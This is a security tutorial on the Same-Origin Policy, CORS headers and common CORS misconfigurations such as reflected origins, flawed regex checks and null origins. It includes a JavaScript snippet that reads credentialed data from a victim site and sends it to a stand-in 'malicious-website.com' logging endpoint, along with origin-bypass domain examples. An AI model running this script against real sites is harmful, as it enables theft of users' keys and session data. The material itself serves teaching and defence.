## Same-Origin Policy
Is a policy that instructs how web browsers interact between web pages. According to this policy, a script on one web page can access data on another only if both pages share the same origin. This "origin" is identified by combining the URI scheme, hostname, and port number. 
**Examples:**
- Same domain, different port.
- HTTP/HTTPS interaction: a script running on http is not allowed to access resources on https, even though they share the same domain.

## Cross-Origin Resource Sharing 
CORS is a mechanism defined by HTTP headers that allow servers to specify how resources can be requested from different origins. While the Same-Origin Policy (SOP) restricts web pages by default to making requests to the same domain, CORS enables servers to declare exceptions to this policy, allowing web pages to request resources from other domains under controlled conditions.

## Different HTTP Headers Involved in CORS 
1. **Access-Control-Allow-Origin**: This header specifies which domains are allowed to access the resources.
2. **Access-Control-Allow-Methods**: Specifies the HTTP methods (GET, POST, etc.) that can be used during the request.
3. **Access-Control-Allow-Headers**: Indicates which HTTP headers can be used during the actual request.
4. **Access-Control-Max-Age**: Defines how long the results of a preflight request can be cached.
5. **Access-Control-Allow-Credentials**: This header instructs the browser whether to expose the response to the frontend JS code when credentials like cookies, HTTP authentication, or client-side SSL certificates are sent with the request.

## Common Scenarios Where CORS is Applied
1. **APIs and Web Services**: When a web application from one domain needs to access an API hosted on a different domain, CORS enables this interaction. For instance, a frontend application at `example-client.com` might need to fetch data from `example-api.com`.
2. **Content Delivery Networks (CDNs)**: Many websites use CDNs to load libraries like jQuery or fonts. CORS enables these resources to be securely shared across different domains.
3. **Web Fonts**: For web fonts to be used across different domains, CORS headers must be set, allowing websites to load fonts from a centralized location.
4. **Third-Party Plugins/Widgets:** Enabling features like social media buttons or chatbots from external sources on a website.
5. **Multi-Domain User Authentication:** Services that offer single sign-on (SSO) or use tokens (like OAuth) to authenticate users across multiple domains rely on CORS to exchange authentication data securely.

## Simple Requests vs. Preflight Requests
**Simple Requests**: These requests meet certain criteria set by CORS that make them "simple". They are treated similarly to same-origin requests, with some restrictions. A request is considered simple if it uses the GET, HEAD, or POST method, and the POST request's `Content-Type` header is one of `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`. Additionally, the request should not include custom headers that aren't CORS-safe listed. Simple requests are sent directly to the server with the `Origin` header, and the response is subject to CORS policy enforcement based on the `Access-Control-Allow-Origin` header. Importantly, cookies and HTTP authentication data are included in simple requests if the site has previously set such credentials, even without the `Access-Control-Allow-Credentials` header being true.
**Preflight Requests**: These are CORS requests that the browser "preflights" with an OPTIONS request before sending the actual request to ensure that the server is willing to accept the request based on its CORS policy. Preflight is triggered when the request does not qualify as a "simple request", such as when using HTTP methods other than GET, HEAD, or POST, or when POST requests are made with another `Content-Type` other than the allowed values for simple requests, or when custom headers are included. The preflight OPTIONS request includes headers like `Access-Control-Request-Method` and `Access-Control-Request-Headers`, indicating the method and custom headers of the actual request. The server must respond with appropriate CORS headers, such as `Access-Control-Allow-Methods`, `Access-Control-Allow-Headers`, and `Access-Control-Allow-Origin` to indicate that the actual request is permitted. If the preflight succeeds, the browser will send the actual request with credentials included if `Access-Control-Allow-Credentials` is set to true.

## Access-Control-Allow-Origin Header
The ACAO header is a curcial component of the CORS policy. It is used by server to indicate whether the resources on a website can be accessed by a web page from a different origin. This header is part of the HTTP response provided by the server.
When a browser makes a cross-origin request, it includes the origin of the requesting site in the HTTP request. The server then checks this origin against its CORS policy. If the origin is permitted, the server includes the `Access-Control-Allow-Origin` header in the response, specifying either the allowed origin or a wildcard (`*`), which means any origin is allowed.
#### ACAO Configurations
- **Single Origin**:
    - Configuration: `Access-Control-Allow-Origin: https://example.com`
    - Implication: Only requests originating from `https://example.com` are allowed. This is a secure configuration, as it restricts access to a known, trusted origin.
- **Multiple Origins**:
    - Configuration: Dynamically set based on a list of allowed origins.
    - Implication: Allows requests from a specific set of origins. While this is more flexible than a single origin, it requires careful management to ensure that only trusted origins are included.
- **Wildcard Origin**:
    - Configuration: `Access-Control-Allow-Origin: *`
    - Implication: Permits requests from any origin. This is the least secure configuration and should be used cautiously. It's appropriate for publicly accessible resources that don't contain sensitive information.
- **With Credentials**:
    - Configuration: `Access-Control-Allow-Origin` set to a specific origin (wildcards not allowed), along with `Access-Control-Allow-Credentials: true`
    - Implication: Allows sending of credentials, such as cookies and HTTP authentication data, to be included in cross-origin requests. However, it's important to note that browsers will send cookies and authentication data without the Access-Control-Allow-Credentials header for simple requests like some GET and POST requests. For preflight requests that use methods other than GET/POST or custom headers, the Access-Control-Allow-Credentials header must be **true** for the browser to send credentials.

#### Common CORS Misconfigurations
CORS misconfigurations can create significant security vulnerabilities in web applications. Understanding these common misconfigurations is crucial for both developers and security professionals. We will explore several typical misconfigurations and how they can be exploited.

1. **Null Origin Misconfiguration:** This occurs when a server accepts requests from the "null" origin. This can happen in scenarios where the origin of the request is not a standard browser environment, like from a file (`file://`) or a data URL. An attacker could craft a phishing email with a link to a malicious HTML file. When the victim opens the file, it can send requests to the vulnerable server, which incorrectly accepts these as coming from a 'null' origin. Servers should be configured to explicitly validate and not trust the 'null' origin unless necessary and understood.
2. **Bad Regex in Origin Checking:** Improperly configured regular expressions in origin checking can lead to accepting requests from unintended origins. For example, a regex like `/example.com$/` would mistakenly allow `badexample.com`. An attacker could register a domain that matches the flawed regex and create a malicious site to send requests to the target server. Another example of lousy regex could be related to subdomains. For example, if domains starting with `example.com` is allowed, an attacker could use `example.com.attacker123.com`. The application should ensure that regex patterns used for validating origins are thoroughly tested and specific enough to exclude unintended matches.
3. **Trusting Arbitrary Supplied Origin:** Some servers are configured to echo back the `Origin` header value in the `Access-Control-Allow-Origin` response header, effectively allowing any origin. An attacker can craft a custom HTTP request with a controlled origin. Since the server echoes this origin, the attacker's site can bypass the SOP restrictions. Instead of echoing back origins, maintain an allowlist of allowed origins and validate against it.
# Server-generated ACAO header from client-specified Origin header
Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain. For example, consider an application that receives the following request:

```
GET /sensitive-victim-data HTTP/1.1 Host: vulnerable-website.com Origin: https://malicious-website.com Cookie: sessionid=...
```
It then responds with:
```
HTTP/1.1 200 OK Access-Control-Allow-Origin: https://malicious-website.com Access-Control-Allow-Credentials: true ...
```
Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain.
If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); 
req.withCredentials = true; 
req.send(); 
function reqListener() { 
	location='//malicious-website.com/log?key='+this.responseText; 
};
```
# Errors parsing Origin Headers
Some applications that support access from multiple origins do so by using a whitelist of allowed origins.
When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted. For example, the application receives a normal request like:

```
GET /data HTTP/1.1 
Host: normal-website.com 
... 
Origin: https://innocent-website.com`
```
The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:

```
HTTP/1.1 200 OK 
... 
Access-Control-Allow-Origin: https://innocent-website.com
```

Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all domains ending in:

`normal-website.com`

An attacker might be able to gain access by registering the domain:

`hackersnormal-website.com`

Alternatively, suppose an application grants access to all domains beginning with

`normal-website.com`

An attacker might be able to gain access using the domain:

`normal-website.com.evil-user.net`

## Whitelisted null origin value
The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.
## Exploiting XSS via CORS trust relationships
Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
Given the following request:
```
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=...
```
If the server responds with:
```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```
Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:
`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

## Breaking TLS with poorly configured CORS
Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. You can exploit the origin to bypass TLS.

## Intranets and CORS without Credentials
Most CORS attacks rely on the presence of the response header:
`Access-Control-Allow-Credentials: true`
Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.
However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:

`GET /reader?url=doc1.pdf Host: intranet.normal-website.com Origin: https://normal-website.com`

And the server responds with:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: *`